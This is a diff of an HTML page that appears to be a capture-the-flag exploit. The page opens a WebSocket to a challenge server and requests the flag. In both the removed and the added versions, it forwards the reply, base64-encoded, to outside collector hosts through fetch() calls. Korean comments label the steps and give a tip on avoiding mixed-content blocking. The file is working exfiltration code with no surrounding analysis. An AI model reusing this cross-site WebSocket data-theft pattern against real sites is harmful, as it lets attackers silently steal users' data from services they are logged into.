@@ -1,30 +1,26 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<meta charset="utf-8">
+<script>
+/* ---------- 0. 스크립트 실행 확인 ---------- */
+fetch('https://kpqfufz.request.dreamhack.games/?status=loaded')
+  .catch(()=>{});
 
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Document</title>
-</head>
+/* ---------- 1. WebSocket 열고 /getFlag 전송 ---------- */
+const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
 
-<body>
-  <script>
-    fetch('https://kpqfufz.request.dreamhack.games/?init=' + encodeURIComponent(e.message))
-    fetch('http://server.dottak.me/?init=' + encodeURIComponent(e.message));
+ws.addEventListener('open', () => {
+  ws.send(JSON.stringify({ message: '/getFlag' }));
+});
 
-    const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
-    ws.onopen = () => {
-      ws.send(JSON.stringify({ message: '/getFlag' }));
-    };
-    ws.onmessage = (event) => {
-      fetch('https://kpqfufz.request.dreamhack.games/?flag=' + encodeURIComponent(event.data));
-      fetch('http://server.dottak.me/?flag=' + encodeURIComponent(event.data));
-    };
-    ws.onerror = (e) => {
-      fetch('https://kpqfufz.request.dreamhack.games/?error=' + encodeURIComponent(e.message))
-      fetch('http://server.dottak.me/?error=' + encodeURIComponent(e.message));
-    };
-  </script>
-</body>
+/* ---------- 2. 플래그 수신 → 외부 서버로 전송 ---------- */
+function exfil(tag, data) {
+  const payload = encodeURIComponent(btoa(data));      // base64 → URL-safe
+  fetch(`https://kpqfufz.request.dreamhack.games/?${tag}=${payload}`).catch(()=>{});
+  /* 혼합-콘텐츠 차단을 피하려면 HTTPS 엔드포인트만 사용하는 편이 안전합니다.
+     server.dottak.me 가 HTTPS를 지원한다면 아래 한 줄을 https:// 로 교체해 주십시오. */
+  fetch(`http://server.dottak.me/?${tag}=${payload}`).catch(()=>{});
+}
 
-</html>
+ws.addEventListener('message', ev => exfil('flag', ev.data));
+ws.addEventListener('error',   ev => exfil('error', ev.message || 'ws_error'));
+</script>
